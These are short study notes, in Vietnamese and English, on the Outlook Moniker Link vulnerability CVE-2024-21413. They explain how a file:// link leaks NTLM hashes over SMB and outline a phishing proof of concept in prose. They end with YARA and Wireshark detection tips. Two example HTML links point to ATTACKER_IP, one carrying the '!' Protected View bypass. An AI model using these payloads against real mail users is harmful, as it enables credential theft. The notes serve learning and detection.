# 1. Introduction
- Khi attacker gửi email chứa hyperlink as a malicious Moniker Link cho nạn nhân, nạn nhân click vào vào hyperlink, Outlook gửi user's NTLM credential cho attacker.

# 2. Moniker Link (CVE-2024-21413)
## 2.1 Moniker Link là gì?
- Moniker link là 1 cách đặc biệt để gọi ứng dụng hoặc tài nguyên trên Windows. Bình thường, các đường dẫn như `http://` hoặc `https://` sẽ mở một trang web, nhưng `file://` có thể được sử dụng để mở một tệp hoặc một thư mục trên máy tính hoặc mạng nội bộ.
- Ví dụ: `<a href="file://ATTACKER_IP/test">Click me</a>
`
- Khi user nhấp vào, Outlook sẽ cố gắng truy cập `test` trên **máy chủ của attacker** `ATTACKER_IP`. Nếu máy nạn nhân đang dùng **SMB protocol** nó sẽ gửi thông tin xác thực **netNTLMv2 hash** đến attacker.

## 2.2 Protected View
- Trên Outlook có 1 cơ chế là **Protected View** hiển thị cảnh báo hoặc chặn hoàn toàn nhằm hạn chế mở tệp hoặc macilious link.

## 2.3 Cách bypass Protected View
- Thêm `!` vào đường dẫn để bypass: ` <a href="file://ATTACKER_IP/test!exploit">Click me</a>`.

- **Remote Code Execution (RCE)** vẫn có khả năng xảy ra vì Moniker Links dùng Component Object Model (COM) on Windows.

# 3. Exploitation
The PoC:

- Takes an attacker & victim email. Normally, you would need to use your own SMTP server.
- Requires the password to authenticate.
- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
- Then, fill in the "subject", "from" and "to" fields in the email
- Finally, it sends the email to the mail server

# 4. Detection
- **YARA**: Giúp phát hiện email có chứa `file:\\` trong Moniker Link.
- **Wireshark**: SMB request từ victim tới client có thể xem được trong packet capture và netNTLMv2 hash.